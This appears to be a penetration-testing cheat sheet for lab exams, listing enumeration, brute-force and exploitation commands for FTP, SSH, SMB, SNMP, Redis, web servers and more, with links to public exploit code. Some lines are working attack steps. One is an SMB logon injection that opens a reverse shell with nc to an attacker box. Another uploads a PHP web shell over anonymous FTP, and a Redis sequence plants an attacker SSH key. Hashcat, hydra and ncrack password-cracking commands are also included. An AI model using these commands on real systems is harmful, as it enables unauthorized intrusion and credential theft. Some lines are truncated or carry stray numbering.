
anonymous login check
ftp <ip address>
username : anonymous
pwd : anonymous
file upload -> put shell.php
SSH : (Port 22)
id_rsa.pub : Public key that can be used in authorized_keys for login
id_rsa : Private key that is used for login. Might ask for password. can be cracked with
ssh2john and john
id_rsa
ssh -i id_rsa user@10.10.10.x
For passwordless login, add id_rsa.pub to target's authorized_keys
ssh2john
DNS Zone transfer check : (Port 53)
If port 53 is open
Add host to /etc/hosts
dig axfr smasher.htb @10.10.10.135
https://ghostphisher.github.io/smasher2
Add the extracted domain to /etc/hosts and dig again
RPC Bind (111)
rpcclient --user="" --command=enumprivs -N 10.10.10.101
rpcinfo –p 10.10.10.102
rpcbind -p 10.10.10.103
RPC (135)
rpcdump.py 10.11.1.121 -p 1351
rpcdump.py 10.11.1.121 -p 135 | grep ncacn_np // get pipe names2
3
rpcmap.py ncacn_ip_tcp:10.11.1.121[135]4
SMB (139 & 445)
https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html
nmap --script smb-protocols 10.10.10.101
2
smbclient -L //10.10.10.103
smbclient -L //10.10.10.10 -N // No password (SMB Null session)4
smbclient --no-pass -L 10.10.10.105
smbclient //10.10.10.10/share_name6
7
smbmap -H 10.10.10.108
smbmap -H 10.10.10.10 -u '' -p ''9
smbmap -H 10.10.10.10 -s share_name10
11
crackmapexec smb 10.10.10.10 -u '' -p '' --shares12
crackmapexec smb 10.10.10.10 -u 'sa' -p '' --shares13
crackmapexec smb 10.10.10.10 -u 'sa' -p 'sa' --shares14
crackmapexec smb 10.10.10.10 -u '' -p '' --share share_name15
16
enum4linux -a 10.10.10.1017
18
rpcclient -U "" 10.10.10.1019
* enumdomusers20
* enumdomgroups21
* queryuser [rid]22
* getdompwinfo23
* getusrdompwinfo [rid]24
25
ncrack -u username -P rockyou.txt -T 5 10.10.10.10 -p smb -v26
27
mount -t cifs "//10.1.1.1/share/" /mnt/wins28
29
mount -t cifs "//10.1.1.1/share/" /mnt/wins -o vers=1.0,user=root,uid=0,gid30
31
SMB Shell to Reverse Shell :32
33
smbclient -U "username%password" //192.168.0.116/sharename34
smb> logon “/=nc ‘attack box ip’ 4444 -e /bin/bash"35
36
Checklist :37
* Samba symlink directory traversal attack38
SMB Exploits :
Samba "username map script" Command Execution - CVE-2007-2447
Version 3.0.20 through 3.0.25rc3
Samba-usermap-exploit.py -
https://gist.github.com/joenorton8014/19aaa00e0088738fc429cff2669b9851
Eternal Blue - CVE-2017-0144
SMB v1 in Windows Vista SP2; Windows Server 2008 SP2 and R2 SP1; Windows 7
SP1; Windows 8.1; Windows Server 2012 Gold and R2; Windows RT 8.1; and
Windows 10 Gold, 1511, and 1607; and Windows Server 2016
https://github.com/adithyan-ak/MS17-010-Manual-Exploit
SambaCry - CVE-2017-7494
4.5.9 version and before
https://github.com/opsxcq/exploit-CVE-2017-7494
SNMP (161)
snmpwalk -c public -v1 10.0.0.01
snmpcheck -t 192.168.1.X -c public2
onesixtyone -c names -i hosts3
nmap -sT -p 161 192.168.X.X -oG snmp_results.txt4
snmpenum -t 192.168.1.X5
IRC (194,6667,6660-7000)
nmap -sV --script irc-botnet-channels,irc-info,irc-unrealircd-backdoor -p 194,6660-7000
irked.htb
https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor (exploit code)
NFS (2049)
showmount -e 10.1.1.27
mkdir /mnt/nfs
mount -t nfs 192.168.2.4:/nfspath-shown /mnt/nfs
Permission Denied ? (https://blog.christophetd.fr/write-up-vulnix/)
MYSQL (3306)
nmap -sV -Pn -vv 10.0.0.1 -p 3306 --script mysql-audit,mysql-databases,mysql-dump-
hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-
variables,mysql-vuln-cve2012-2122
Redis (6379)
In the output of config get * you could find the home of the redis user (usually /var/lib/redis
or /home/redis/.ssh), and knowing this you know where you can write the
authenticated_users file to access via ssh with the user redis. If you know the home of other
valid user where you have writable permissions you can also abuse it:
1. Generate a ssh public-private key pair on your pc: ssh-keygen -t rsa
2. Write the public key to a file :
(echo -e "\n\n"; cat ./.ssh/id_rsa.pub; echo -e "\n\n") > foo.txt
3. Import the file into redis : cat foo.txt | redis-cli -h 10.10.10.10 -x set crackit
4. Save the public key to the authorized_keys file on redis server:
root@Urahara:~# redis-cli -h 10.85.0.521
10.85.0.52:6379> config set dir /home/test/.ssh/2
OK3
10.85.0.52:6379> config set dbfilename "authorized_keys"4
OK5
10.85.0.52:6379> save6
OK7
Port Knocking :
TCP1
knock -v 192.168.0.116 4 27391 1592
3
UDP4
knock -v 192.168.0.116 4 27391 159 -u5
6
TCP & UDP7
knock -v 192.168.1.111 159:udp 27391:tcp 4:udp8
Misc :
Run autorecon
https://github.com/s0wr0b1ndef/OSCP-
note/blob/master/ENUMERATION/enumeration
IF NOTHING WORKS
HTB Admirer (https://www.youtube.com/watch?
v=_zMg0fHwwfw&ab_channel=IppSec)
Bruteforce
Directory Bruteforce
Cewl :
cewl -d 2 -m 5 -w docswords.txt http://10.10.10.101
2
-d depth3
-m minimum word length4
-w output file5
--lowercase lowercase all parsed words (optional)6
Password / Hash Bruteforce
Hashcat :
https://hashcat.net/wiki/doku.php?id=example_hashes // m parameter
https://mattw.io/hashID/types // hashid match
hashcat -m 0 'hash$' /home/kali/Desktop/rockyou.txt // MD5 raw1
hashcat -m 1800 'hash$' /home/kali/Desktop/rockyou.txt // sha512crypt2
hashcat -m 1600 'hash$' /home/kali/Desktop/rockyou.txt // MD5(APR)3
hashcat -m 1500 'hash$' /home/kali/Desktop/rockyou.txt // DES(Unix), Tradit4
hashcat -m 500 'hash$' /home/kali/Desktop/rockyou.txt // MD5crypt, MD5 (Uni5
hashcat -m 400 'hash$' /home/kali/Desktop/rockyou.txt // Wordpress6
John :
john hashfile --wordlist=/home/kali/Desktop/rockyou.txt --format=raw-md5
Online tools :
https://crackstation.net/
LM, NTLM, md2, md4, md5, md5(md5_hex), md5-half, sha1, sha224, sha256,
sha384, sha512, ripeMD160, whirlpool, MySQL 4.1+ (sha1(sha1_bin)),
QubesV3.1BackupDefaults
https://www.dcode.fr/tools-list
MD4, MD5, RC4 Cipher, RSA Cipher, SHA-1, SHA-256, SHA-512, XOR Cipher
https://www.md5online.org/md5-decrypt.html (MD5)
https://md5.gromweb.com/ (MD5)
Protocols Bruteforce
Hydra
TELNET, FTP, HTTP, HTTPS, HTTP-PROXY, SMB, SMBNT, MS-SQL, MYSQL, REXEC, irc,
RSH, RLOGIN, CVS, SNMP, SMTP, SOCKS5, VNC, POP3, IMAP, NNTP, PCNFS, XMPP, ICQ,
SAP/R3, LDAP2, LDAP3, Postgres, Teamspeak, Cisco auth, Cisco enable, AFP,
Subversion/SVN, Firebird, LDAP2, Cisco AAA
Medusa
AFP, CVS, FTP, HTTP, IMAP, MS-SQL, MySQL, NetWare NCP, NNTP, PcAnywhere, POP3,
PostgreSQL, REXEC, RLOGIN, RSH, SMBNT, SMTP-AUTH, SMTP-VRFY, SNMP, SSHv2,
Subversion (SVN), Telnet, VMware Authentication Daemon (vmauthd), VNC, Generic
Wrapper, Web Form
Ncrack (Fastest)
RDP, SSH, http(s), SMB, pop3(s), VNC, FTP, telnet
SSH
ncrack -v -U user.txt -P pass.txt ssh://10.10.10.10:<port> -T51
hydra -L users.txt -P pass.txt 192.168.0.114 ssh2
Wordlist
// For removing duplications in wordlist1
cat wordlist.txt| sort | uniq > new_word.txt2
SMB :
ncrack -u qiu -P rockyou.txt -T 5 192.168.0.116 -p smb -v
HTTP Post
hydra -L users.txt -P rockyou.txt 10.10.10.10 http-post-form "/login.php:use
80, 443
Checklist
View SSL certificates for usernames
View Source code
Check /robots.txt, .htaccess, .htpasswd
Check HTTP Request
Run Burp Spider
View Console
Use Nikto
Check OPTIONS
HTTP PUT / POST File upload
Parameter fuzzing with wfuzz
Browser response vs Burp response
Shell shock (cgi-bin/status)
Cewl wordlist and directory bruteforce
nmap --script http-enum 192.168.10.55
Apache version exploit & other base server exploits
Port 443 :
nmap -Pn -sV --script ssl* -p 443 10.10.10.60 -A -T5
Heartbleed ( sslyze --heartbleed <ip> )
Heartbleed exploit code (https://gist.github.com/eelsivart/10174134)
Shellshock
Poodle
IIS :
https://book.hacktricks.xyz/pentesting/pentesting-web/iis-internet-information-services
Try changing file.asp file to file.asp.txt to reveal the source code of the files
Apache :
Struts (https://github.com/LightC0der/Apache-Struts-0Day-Exploit)
Shell shock (https://www.exploit-db.com/exploits/34900)
OpenFuck (https://github.com/exploit-inters/OpenFuck)
Directory Enumeration
Apache : x -> php, asp, txt, xml, bak
IIS : x-> asp, aspx, txt, ini, tmp, bak, old
Gobuster quick directory busting
gobuster dir -w /usr/share/seclists/Discovery/Web_Content/common.txt -t 80 -
Gobuster search with file extension
gobuster dir -w /usr/share/seclists/Discovery/Web_Content/common.txt -t 1001
2
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.tx3
4
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-medium-direc5
Gobuster comprehensive directory busting
gobuster -s 200,204,301,302,307,403 -w /usr/share/seclists/Discovery/Web_Con
gobuster dir -t 100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-
medium.txt -k -u http://10.10.10.x
-k (ignore ssl verification)
-x specific extension
Dirbuster
Change wordlists (Wfuzz, dirb)
Custom directory enumeration (HTB Obscurity)
wfuzz -c -z file,common.txt -u
http://10.10.10.168:8080/FUZZ/SuperSecureServer.py
